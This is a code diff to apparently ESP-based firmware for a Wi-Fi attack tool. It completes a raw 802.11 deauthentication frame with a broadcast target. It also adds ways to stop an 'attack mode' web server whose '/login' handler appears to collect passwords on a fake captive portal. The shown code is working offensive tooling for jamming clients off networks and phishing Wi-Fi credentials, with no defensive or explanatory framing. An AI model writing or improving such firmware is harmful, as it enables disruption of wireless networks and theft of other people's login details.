@@ -41,6 +41,7 @@ static uint8_t deauthPkt[26] = {                     /* MACs filled later   */
     0xC0, 0x00,                  0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00,                  0x02, 0x00 // Reason code 2
 };
 
@@ -670,8 +671,12 @@ static void checkFactoryReset(void)
         Serial.println(">>> Factory reset – clearing ALL data...");
         clearAll();
         ESP.restart();
+    } else if (millis() - start >= 100) {
+        Serial.println(">>> Short press – stopping attack and returning to config...");
+        clearConfig();
+        ESP.restart();
     }
-    Serial.println("Button released early – skipping reset.");
+    Serial.println("Button press too short.");
 }
 
 /* ================================================================== */
@@ -743,6 +748,15 @@ static void enterAttackMode(void)
 
     server.on("/",      HTTP_GET,  onAttackRoot);
     server.on("/login", HTTP_POST, onAttackLogin);
+    server.on("/stop",  HTTP_GET,  []() {
+        server.send(200, "text/html; charset=utf-8", 
+            F("<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
+              "<div style='text-align:center;font-family:sans-serif;margin-top:50px;'>"
+              "<h2>攻击已停止</h2><p>设备即将重启并返回配置模式。</p></div>"));
+        delay(1000);
+        clearConfig();
+        ESP.restart();
+    });
     server.onNotFound(onNotFound);
     server.begin();
 
